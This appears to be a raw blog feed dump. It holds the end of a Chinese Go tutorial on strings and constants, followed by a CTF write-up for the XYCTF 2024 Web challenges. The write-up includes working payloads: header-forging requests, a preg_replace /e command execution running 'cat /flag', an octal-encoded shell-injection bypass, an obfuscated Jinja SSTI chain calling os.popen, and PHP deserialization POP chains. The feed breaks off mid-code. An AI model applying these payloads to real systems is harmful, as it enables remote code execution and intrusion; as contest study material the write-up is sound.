class="built_in">len</span>(<span class="string">&quot;你好&quot;</span>)) <span class="comment">// 6</span></span><br><span class="line"><span class="comment">//函数返回的是字符串中的字节长度，而不是字符数量。因为 &quot;你好&quot; 中的每个字符在 UTF-8 编码下都占用 3 个字节，所以 len(&quot;你好&quot;) 的结果是 6</span></span><br><span class="line">fmt.Println(utf8.RuneCountInString(<span class="string">&quot;你好&quot;</span>)) <span class="comment">//2 获取字符串中的字符数量</span></span><br></pre></td></tr></table></figure><p>第i个字节并不一定是字符串的第i个字符，因为对于非ASCII字符的UTF8编码会要两个或多个字节。</p><p>子字符串操作s[i:j]基于原始的s字符串的第i个字节开始到第j个字节（并不包含j本身）生成一个新字符串。生成的新字符串将包含j-i个字节。</p><p>这一点和Python的切片操作很像，但是也有所不同。Python是以字符下标来切片，而Go是基于字节来生成新字符串。但可以通过将字符串转换为rune切片（rune在Go中是一个字符类型，可以处理任何Unicode字符）来按字符进行操作。这是一个例子：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">s := <span class="string">&quot;你好,世界&quot;</span></span><br><span class="line">r := []<span class="type">rune</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取第一个字符到第三个字符（不包括第三个字符）</span></span><br><span class="line">sub := <span class="type">string</span>(r[<span class="number">0</span>:<span class="number">2</span>])  <span class="comment">// 输出：&quot;你好&quot;</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>[]rune(s)</code>将字符串<code>s</code>转换为一个rune切片，然后我们可以按照字符的索引进行切片操作。注意，这里的索引是按照字符，而不是字节，所以即使&quot;你&quot;和&quot;好&quot;每个都占用3个字节，它们仍然被视为一个字符。</p><p><code>rune</code> 是一个整数类型。它是 int32 的别名，用于表示 Unicode 码点。当尝试打印一个 <code>rune</code> 类型的值时，你实际上是在打印一个整数，这个整数表示的是字符的 Unicode 码点。所以需要把rune类型再转回string类型。这点有点类似C中的char。</p><p>可以通过<code>+</code>来拼接字符串，也可以通过<code>=</code>和<code>&gt;</code>等来比较字符串。比较字符串是通过比较逐个字节完成的，因此比较的结果是字符串自然编码的顺序。</p><p>字符串的值是不可变的，也就是说字符串的内部属性不可更改，这使得复制字符串时变得快捷且低廉，不需要像C语言那样单独开辟一份新的空间，两份字符串可以共享一个内存地址。同理<strong>切片也可以直接引用字符串的地址，而这一切都是安全的</strong>。（这里划重点，后面要考）</p><p>值得注意的是，Go在处理字符串时表现的像Java（Java的字符串也不可改变），但处理切片时和Python虽然很像又有不同。在Python中，字符串和切片都被视为序列，当做列表处理，所以可以更改字符串的值。但是Go中字符串和序列是两种不同地点数据结构，在 Go 语言中，切片是一个包含三个字段的数据结构：</p><ol><li>一个指向底层数组的指针，这个指针指向的是切片第一个元素在底层数组中的位置。</li><li>切片的长度（len），即切片中元素的数量。</li><li>切片的容量（cap），即从切片的开始位置到底层数组的结束位置的元素数量。</li></ol><p>切片本身有自己的内存地址，这个地址是存储切片数据结构的地址。而切片存储的数据实际上是底层数组的一个引用，通过切片的指针字段可以访问到底层数组。</p><p>这种设计使得切片非常灵活，可以轻松地对底层数组进行子集选择，而无需复制整个数组。同时，由于切片存储的是底层数组的引用，所以通过切片对底层数组进行的修改会直接反映在底层数组上。</p><p>还记得我们说过这么一句话吗？“切片也可以直接引用字符串的地址，而这一切都是安全的”。这句话其实有一点问题，因为字符串本身不可更改，而切片却可以通过对底层数组的引用修改底层数组的值，那么如果对字符串s，修改s[7:]的切片是否可以更改字符串呢？<strong>答案是否</strong>，因为s[7:]看上去像是一个切片，实际上这只是对原字符串的子字符串划分，它的类型还是字符串而不是切片。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s := <span class="string">&quot;adam ben&quot;</span></span><br><span class="line">s1 := []<span class="type">rune</span>(s)</span><br><span class="line">fmt.Println(<span class="string">&quot;type:&quot;</span>, reflect.TypeOf(s))</span><br><span class="line">fmt.Println(<span class="string">&quot;type:&quot;</span>, reflect.TypeOf(s[<span class="number">2</span>:]))</span><br><span class="line">fmt.Println(<span class="string">&quot;type:&quot;</span>, reflect.TypeOf(s1))</span><br><span class="line">fmt.Println(<span class="string">&quot;type:&quot;</span>, s1)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">type: string</span></span><br><span class="line"><span class="comment">type: string</span></span><br><span class="line"><span class="comment">type: []int32</span></span><br><span class="line"><span class="comment">type: [97 100 97 109 32 98 101 110]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>如果对象是<strong>数组</strong>，那么的确可以通过直接对数组切片的引用来修改数组的值；但如果对象是字符串，那么这个操作看上去是在切片实际上则还是字符串。</p><p>因为Go语言源文件总是用UTF8编码，且Go语言的文本字符串也以UTF8编码的方式处理。</p><p>一个原生的字符串面值形式是`…`，使用反引号代替双引号。在原生的字符串面值中，没有转义操作；全部的内容都是字面的意思，包含退格和换行，因此一个程序中的原生字符串面值可能跨越多行。这点和PHP中的单引号字符串类似。</p><p>原生字符串面值用于编写正则表达式会很方便，因为正则表达式往往会包含很多反斜杠。原生字符串面值同时被广泛应用于HTML模板、JSON面值、命令行提示信息以及那些需要扩展到多行的场景。</p><h3 id="常量"><a class="markdownIt-Anchor" href="#常量"></a> 常量</h3><p>常量的值在编译期进行计算而不是运行期，一般来说常量的<strong>基础</strong>数据类型有：boolean、string、数字。</p><p>常量的值无法修改。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> pai:=<span class="number">3.14159</span> <span class="comment">//const在C中是老朋友了</span></span><br></pre></td></tr></table></figure><p>如果是批量声明的常量，除了第一个外其它的常量右边的初始化表达式都可以省略，如果省略初始化表达式则表示使用前面常量的初始化表达式写法，对应的常量类型也一样的。例如：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line"> a = <span class="number">1</span></span><br><span class="line"> b</span><br><span class="line"> c = <span class="number">2</span></span><br><span class="line"> d )</span><br><span class="line">fmt.Println(a, b, c, d) <span class="comment">// &quot;1 1 2 2&quot;</span></span><br></pre></td></tr></table></figure><h4 id="itoa常量生成器"><a class="markdownIt-Anchor" href="#itoa常量生成器"></a> itoa常量生成器</h4><p>常量声明可以使用iota常量生成器初始化，它用于生成一组以相似规则初始化的常量，但是不用每行都写一遍初始化表达式。在一个const声明语句中，在第一个声明的常量所在的行，iota将会被置为0，然后在每一个有常量声明的行加一。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">ype Weekday <span class="type">int</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line"> Sunday Weekday = <span class="literal">iota</span></span><br><span class="line"> Monday</span><br><span class="line"> Tuesday</span><br><span class="line"> Wednesday</span><br><span class="line"> Thursday</span><br><span class="line"> Friday</span><br><span class="line"> Saturday</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h4 id="无类型常量"><a class="markdownIt-Anchor" href="#无类型常量"></a> 无类型常量</h4><p>虽然一个常量可以有任意一个确定的基础类型，例如int或 float64，或者是类似time.Duration这样命名的基础类型。但是许多常量并没有一个明确的基础类型。编译器为这些没有明确基础类型的数字常量提供比基础类型更高精度的算术运算。</p><p>这里有六种未明确类型的常量类型，分别是无类型的布尔型、无类型的整数、无类型的字符、无类型的浮点数、无类型的复数、无类型的字符串。</p><p>通过延迟明确常量的具体类型，无类型的常量不仅可以提供更高的运算精度，而且可以直接用于更多的表达式而不需要显式的类型转换。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x <span class="type">float32</span> = math.Pi</span><br><span class="line"><span class="keyword">var</span> y <span class="type">float64</span> = math.Pi</span><br><span class="line"><span class="keyword">var</span> z <span class="type">complex128</span> = math.Pi</span><br><span class="line"><span class="comment">//可以直接使用常量而不需要显式转换</span></span><br></pre></td></tr></table></figure><p>那么本章内容到此为止，Go中所有基本的数据结构都差不多介绍了一遍。下一章则介绍如何通过这些基础的数据结构去组合成数组或结构体等复杂数据类型，然后构建用于解决实际编程问题的数据结构。</p><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/a7a21eb76137fbe20b311c8a2c3ce9bc.jpeg" alt="a7a21eb76137fbe20b311c8a2c3ce9bc" /></p>]]></content>
      
      
      <categories>
          
          <category> Go!Go!Go! </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024XYCTFの部分wp详解</title>
      <link href="/posts/6a364d742574/"/>
      <url>/posts/6a364d742574/</url>
      
        <content type="html"><![CDATA[<p>在大二下打的第一场（其实并不是第一场，只是之前都没成绩\爆零）CTF，属于新生赛级别（没办法大的也打不动，而且我大二上才加入校队勉强也算新人……吧），但是题目量大管饱（100多道），也确实学到了新东西，比起常年坐牢爆零的大比赛来说对个人的能力培养反而更多。</p><p>XYCTF中我主要是在隶属于校队的Xp0int战队中解题，虽说是校队公共账号但是老人都不会出手，基本都是几个新生在折腾。也一度取得了第一名的位置霸榜了几天，但最后一周因为各种安排导致腾不出手打比赛解新题又滑落到了第五的位置，实属惋惜。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/echarts.svg" alt="echarts" /></p><p>不过反正是新生赛，也不会有多大含金量就是了，姑且还是记录一下这次比赛的成果吧。</p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="51-ezmake"><a class="markdownIt-Anchor" href="#51-ezmake"></a> 5.1 ez!Make</h2><h2 id="52-ezmd5"><a class="markdownIt-Anchor" href="#52-ezmd5"></a> 5.2 ezmd5</h2><p>利用fastcoll生成两个md5值相同的图片即可</p><h2 id="53-ezhttp"><a class="markdownIt-Anchor" href="#53-ezhttp"></a> 5.3 EZHTTP</h2><p>robots.txt可以看到有个l0g1n.txt，里面存着账号和密码</p><p>username: XYCTF</p><p>password: @JOILha!wuigqi123$</p><p>登进去之后说要从yuanshen.com来，伪造IP</p><p>用client-ip可以伪造</p><p>现在需要伪造代理</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NjY2YzQ4NjEwM2I5YjZmMGUyODViOTVmMzM5OGYyYWJfaFEyU1pDQUNYbmQ5MlZOWGdTU1BZbG9TVDYzVWdEYWhfVG9rZW46QWc2MmJDa3Vnb25pYVJ4MndtY2NDMmNpbnVkXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA" alt="img" /></p><p>我忘了咋伪造了……</p><p>噢用via可以</p><p>没了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: xyctf.top:38102</span><br><span class="line">User-Agent: XYCTF</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 48</span><br><span class="line">Origin: http://xyctf.top:38102</span><br><span class="line">Connection: close</span><br><span class="line">Referer: yuanshen.com</span><br><span class="line">Client-ip: 127.0.0.1</span><br><span class="line">Via: ymzx.qq.com</span><br><span class="line">Cookie: XYCTF</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">username=XYCTF&amp;password=%40JOILha%21wuigqi123%24</span><br></pre></td></tr></table></figure><h2 id="54-warm-up"><a class="markdownIt-Anchor" href="#54-warm-up"></a> 5.4 Warm up</h2><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MWMzZTM2ZTQ1YWVjMjhiMzNlNmNmMmU5OWI2MDkwNmNfUGJGUTJFa2FYMGMxZVBZQzBobVgzQmRLajhtQ0NoMlRfVG9rZW46SzVPMGJsTWxab0FvN3Z4bkh0cmNyZzFSbkpoXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA" alt="img" /></p><p>Payload:<a href="http://xyctf.top:40339/?val1=QNKCDZO&amp;val2=240610708&amp;md5=0e215962017&amp;XY=QNKCDZO&amp;XYCTF=QNKCDZO">http://xyctf.top:40339/?val1=QNKCDZO&amp;val2=240610708&amp;md5=0e215962017&amp;XY=QNKCDZO&amp;XYCTF=QNKCDZO</a></p><p>之后跳转到/LLeeevvveeelll222.php</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWZmZDY3Y2RkZjk2ZTk1NzRiM2VkOGFiMTAyNmY4ZDhfcENpSHhkaVd0ZVdGaEV5S3NnWmIzeUdpa2xSYllrUlhfVG9rZW46R3VEcmJYWXJFbzVEZEN4TW94ZWNVcWVybmRnXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA" alt="img" /></p><p>好像可以xss，但我不会弹flag啊o(╥﹏╥)o</p><p>好吧，这题不是xss，使用preg_match的/e命令执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Payload：http://xyctf.top:40339/LLeeevvveeelll222.php?a=/123/e&amp;b=system(&#x27;cat /flag&#x27;);&amp;c=123</span><br><span class="line">post：a[]=e</span><br></pre></td></tr></table></figure><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NWI5ZjhjZmI2MmM4Mjk3MmE4YzAzYmRhMTliZmViOWJfQUpRdG16Ulh5b3N6Y2JOTU9KM0RtNndUTjYxTDh6dzRfVG9rZW46U0NHcGJMaUJab2xkUkV4bk5FZmNSWllvbmRlXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA" alt="img" /></p><h2 id="55-牢牢记住逝者为大"><a class="markdownIt-Anchor" href="#55-牢牢记住逝者为大"></a> 5.5 牢牢记住，逝者为大</h2><p>payload:?cmd=%0A<code>$_GET[1]</code>;%23&amp;1=sh -c $‘\143\141\164\40\57\146\154\141\147\40\76\40\61\56\160\150\160’</p><p>%0A换行，%23注释掉后面的mamba out，``执行命令但不回显，$_GET[1]用于绕过长度限制，1参数后的命令执行通过八进制绕过/bin|mv|cp|ls|||f|a|l|?|*|&gt;/i的过滤，接着直接访问1.php得到flag</p><h2 id="56-ezmake"><a class="markdownIt-Anchor" href="#56-ezmake"></a> 5.6 ezMake</h2><h2 id="57-ezmake"><a class="markdownIt-Anchor" href="#57-ezmake"></a> 5.7 ez?Make</h2><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MDgxN2MwNThlNzU0MWI0NWMxMjQ4YzJiZjYwNGYzYjBfS3IxOEJJTkFzdEVVR2psMDhxMTBiTWJiNk9xbkFaTlpfVG9rZW46U29TM2JDMXZ2bzUzcXd4cUc5VWNSZ1VWbmpjXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA" alt="img" /></p><h2 id="58-ezpop"><a class="markdownIt-Anchor" href="#58-ezpop"></a> 5.8 ezPoP</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class   Flag &#123;</span><br><span class="line">    public <span class="variable">$token</span>;</span><br><span class="line">    public <span class="variable">$password</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = new Flag();</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>-&gt;password = &amp;<span class="variable">$flag</span>-&gt;token;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize</span> = serialize(<span class="variable">$flag</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$serialize</span>;</span><br><span class="line"></span><br><span class="line">//O:4:<span class="string">&quot;Flag&quot;</span>:2:&#123;s:5:<span class="string">&quot;token&quot;</span>;N;s:8:<span class="string">&quot;password&quot;</span>;R:2;&#125;</span><br><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">    public <span class="variable">$mack</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B &#123;</span><br><span class="line">    public <span class="variable">$luo</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C &#123;</span><br><span class="line">    public <span class="variable">$wang1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class D &#123;</span><br><span class="line">    public <span class="variable">$lao</span>;</span><br><span class="line">    public <span class="variable">$chen</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class E &#123;</span><br><span class="line">    public <span class="variable">$name</span>;</span><br><span class="line">    public <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = new C();</span><br><span class="line"><span class="variable">$a</span> = new A();</span><br><span class="line"><span class="variable">$a</span>-&gt;mack = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$b</span> = new B();</span><br><span class="line"><span class="variable">$b</span>-&gt;luo = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$d</span> = new D();</span><br><span class="line"><span class="variable">$d</span>-&gt;lao = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$e</span> = new E();</span><br><span class="line"><span class="variable">$e</span>-&gt;num=<span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$serialize</span> = serialize(<span class="variable">$e</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$serialize</span>;</span><br><span class="line"></span><br><span class="line">//pop=O:1:<span class="string">&quot;E&quot;</span>:2:&#123;s:4:<span class="string">&quot;name&quot;</span>;N;s:3:<span class="string">&quot;num&quot;</span>;O:1:<span class="string">&quot;D&quot;</span>:2:&#123;s:3:<span class="string">&quot;lao&quot;</span>;O:1:<span class="string">&quot;B&quot;</span>:1:&#123;s:3:<span class="string">&quot;luo&quot;</span>;O:1:<span class="string">&quot;A&quot;</span>:1:&#123;s:4:<span class="string">&quot;mack&quot;</span>;O:1:<span class="string">&quot;C&quot;</span>:1:&#123;s:5:<span class="string">&quot;wang1&quot;</span>;N;&#125;&#125;&#125;s:4:<span class="string">&quot;chen&quot;</span>;N;&#125;&#125;</span><br><span class="line">&lt;?php</span><br><span class="line">class XYCTFNO1</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$Liu</span>;</span><br><span class="line">    public <span class="variable">$T1ng</span>;</span><br><span class="line">    private <span class="variable">$upsw1ng</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class XYCTFNO2</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$crypto0</span>;</span><br><span class="line">    public <span class="variable">$adwa</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class XYCTFNO3</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$KickyMu</span>;</span><br><span class="line">    public <span class="variable">$fpclose</span>;</span><br><span class="line">    public <span class="variable">$N1ght</span> = <span class="string">&quot;Crypto0&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$XYCTFNO1</span> = new XYCTFNO1();</span><br><span class="line"><span class="variable">$XYCTFNO1</span>-&gt;T1ng = <span class="string">&quot;yuroandCMD258&quot;</span>;</span><br><span class="line"><span class="variable">$XYCTFNO1</span>-&gt;crypto0 = <span class="string">&quot;dev1l&quot;</span>;</span><br><span class="line"><span class="variable">$XYCTFNO2</span> = new XYCTFNO2();</span><br><span class="line"><span class="variable">$XYCTFNO2</span>-&gt;adwa = <span class="variable">$XYCTFNO1</span>;</span><br><span class="line"><span class="variable">$XYCTFNO3</span> = new XYCTFNO3();</span><br><span class="line"><span class="variable">$XYCTFNO3</span>-&gt;N1ght = <span class="string">&quot;oSthing&quot;</span>;</span><br><span class="line"><span class="variable">$XYCTFNO3</span>-&gt;KickyMu = <span class="variable">$XYCTFNO2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize</span> = urlencode(serialize(<span class="variable">$XYCTFNO3</span>));</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$serialize</span>;</span><br><span class="line"></span><br><span class="line">//O%3A8%3A%22XYCTFNO3%22%3A3%3A%7Bs%3A7%3A%22KickyMu%22%3BO%3A8%3A%22XYCTFNO2%22%3A2%3A%7Bs%3A7%3A%22crypto0%22%3BN%3Bs%3A4%3A%22adwa%22%3BO%3A8%3A%22XYCTFNO1%22%3A4%3A%7Bs%3A3%3A%22Liu%22%3BN%3Bs%3A4%3A%22T1ng%22%3Bs%3A13%3A%22yuroandCMD258%22%3Bs%3A17%3A%22%00XYCTFNO1%00upsw1ng%22%3BN%3Bs%3A7%3A%22crypto0%22%3Bs%3A5%3A%22dev1l%22%3B%7D%7Ds%3A7%3A%22fpclose%22%3BN%3Bs%3A5%3A%22N1ght%22%3Bs%3A7%3A%22oSthing%22%3B%7D</span><br></pre></td></tr></table></figure><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjhhNTkyZjdkYTg5Njg4OGM2YmI3MTdjZjRiYzcxYWZfMTJjTXZ6TXNTQnJMRzI2TzRkcWZNd2gyQW00eU50WHBfVG9rZW46VTJwVWJ2WmpHb09pejZ4N21xZGM3UXpWbko3XzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA" alt="img" /></p><h2 id="59-我是一个复读机"><a class="markdownIt-Anchor" href="#59-我是一个复读机"></a> 5.9 我是一个复读机</h2><p>开局弱口令爆破，密码是asdqwe</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NTEwNWYxZDM5M2QxZGRjMjA5OGZiOWZjMTQ3MTZlY2VfaW1iSzZQSTdENHFLZjQzeWRCREhxV3pmQllvM0U1Sm1fVG9rZW46TVV2dGIzODFBb0JjZ1h4Q0RQN2NGTlo5bjh1XzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA" alt="img" /></p><p>然后可以看到第二级页面</p><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MjNhNGE3YTdjMTNjN2QwMzAxNjE0ODJkY2ZlM2IyMGRfUVRQNWIxalhJNFhoNFhFWTlhRTNuUVdFVWtxNzAxYkdfVG9rZW46V05PcWJVUnNtb0pLcDV4UzFMV2NwWFhJbkFkXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA" alt="img" /></p><p>尝试输入49发现大括号被过滤了</p><p>其实不是大括号被过滤，输入框默认已经被大括号扩住了，确定是SSTI注入</p><p>用fenjing一把梭</p><p>payload如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">说%<span class="built_in">print</span> (g.pop|attr(lipsum|escape|batch(<span class="number">22</span>)|<span class="built_in">list</span>|first|last*<span class="number">2</span>+<span class="built_in">dict</span>(GLOBALS=x)|first|lower+lipsum|escape|batch(<span class="number">22</span>)|<span class="built_in">list</span>|first|last*<span class="number">2</span>)|attr(lipsum|escape|batch(<span class="number">22</span>)|<span class="built_in">list</span>|first|last*<span class="number">2</span>+<span class="built_in">dict</span>(GETITEM=x)|first|lower+lipsum|escape|batch(<span class="number">22</span>)|<span class="built_in">list</span>|first|last*<span class="number">2</span>)(lipsum|escape|batch(<span class="number">22</span>)|<span class="built_in">list</span>|first|last*<span class="number">2</span>+<span class="built_in">dict</span>(BUILTINS=x)|first|lower+lipsum|escape|batch(<span class="number">22</span>)|<span class="built_in">list</span>|first|last*<span class="number">2</span>)|attr(lipsum|escape|batch(<span class="number">22</span>)|<span class="built_in">list</span>|first|last*<span class="number">2</span>+<span class="built_in">dict</span>(GETITEM=x)|first|lower+lipsum|escape|batch(<span class="number">22</span>)|<span class="built_in">list</span>|first|last*<span class="number">2</span>)(lipsum|escape|batch(<span class="number">22</span>)|<span class="built_in">list</span>|first|last*<span class="number">2</span>+<span class="built_in">dict</span>(IMPORT=x)|first|lower+lipsum|escape|batch(<span class="number">22</span>)|<span class="built_in">list</span>|first|last*<span class="number">2</span>))(<span class="built_in">dict</span>(OS=x)|first|lower).popen((((<span class="built_in">dict</span>(((<span class="number">0</span>,<span class="number">1</span>),(<span class="number">0</span>,<span class="number">1</span>)))|replace(<span class="number">1</span>|center|first,x)|replace(<span class="number">1</span>,<span class="built_in">dict</span>(c=x)|join)).<span class="built_in">format</span>(<span class="number">37</span>)+<span class="built_in">dict</span>(c=x)|join)*<span class="number">9</span>)%(<span class="number">99</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">47</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>)).read()%</span><br></pre></td></tr></table></figure><h2 id="510-ezrce"><a class="markdownIt-Anchor" href="#510-ezrce"></a> 5.10 ezRCE</h2><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmFmNGY3NTUyOWJjZjVkOTI5YTllNTYyZWQxN2FjNDhfNFg1WnFkbkZjWXJRb1BHRVN1SXZVWHE1YVUzcmxlREFfVG9rZW46QklDN2J3OUIxbzQ1blp4TTRDbGNESnVSblVmXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA" alt="img" /></p><p><a href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60">https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60</a></p><h2 id="511-ezserialize"><a class="markdownIt-Anchor" href="#511-ezserialize"></a> 5.11 ezSerialize</h2><p><img src="https://xp0int-team.feishu.cn/space/api/box/stream/download/asynccode/?code=OGZiYzBhNDQ3YmUwNTM5ZGY3ZDg1NzlhNTFjNGVlMmNfbzdNZjRyc08wTFV2bm9oNGtOUmxIa3hYV0ZXRTFLeEtfVG9rZW46VmdKQ2JDdUZTb1oyNXB4Q0s4dmNINDNYbmRkXzE3MTQxODY2Mzg6MTcxNDE5MDIzOF9WNA" alt="img" /></p><p>/?pop=O:4:“Flag”:2:{s:5:“token”;s:3:“111”;s:8:“password”;R:2;}</p><p>跳转/fpclosefpclosefpcloseffflllaaaggg.php</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class A &#123;</span><br><span class="line">    public <span class="variable">$mack</span>;</span><br><span class="line">    public <span class="keyword">function</span> __invoke()//调用不可访问的方法时，__invoke() 方法会被调用。</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;mack-&gt;nonExistentMethod();//这里会调用__call()方法</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B &#123;</span><br><span class="line">    public <span class="variable">$luo</span>;</span><br><span class="line">    public <span class="keyword">function</span> __get(<span class="variable">$key</span>)&#123;//当调用不可访问的属性时，__get() 会被调用。</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;o.O&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable">$this</span>-&gt;luo;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$function</span>();//这里会调用__invoke()方法</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C &#123;</span><br><span class="line">    public <span class="variable">$wang1</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __call(<span class="variable">$wang1</span>,<span class="variable">$wang2</span>)//当调用不可访问的方法时，__call() 会被调用。</span><br><span class="line">    &#123;</span><br><span class="line">        include <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;flag2&quot;</span>;//这里就是最终的flag</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class D &#123;</span><br><span class="line">    public <span class="variable">$lao</span>;</span><br><span class="line">    public <span class="variable">$chen</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()&#123;//当一个类被当成字符串时，__toString() 方法会被调用。</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;O.o&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="built_in">return</span> is_null(<span class="variable">$this</span>-&gt;lao-&gt;chen) ? <span class="string">&quot;&quot;</span> : <span class="variable">$this</span>-&gt;lao-&gt;chen;//这里会调用__get()方法</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class E &#123;</span><br><span class="line">    public <span class="variable">$name</span> = <span class="string">&quot;xxxxx&quot;</span>;</span><br><span class="line">    public <span class="variable">$num</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __unserialize(<span class="variable">$data</span>)//当调用未定义的序列化方法时，__unserialize() 会被调用。</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;br&gt;学到就是赚到!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$data</span>[<span class="string">&#x27;num&#x27;</span>];//这里会调用__wakeup()方法和__toString()方法</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;//当对象被反序列化时，会调用 __wakeup() 方法。</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;name!=<span class="string">&#x27;&#x27;</span> || <span class="variable">$this</span>-&gt;num!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;旅行者别忘记旅行的意义!&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 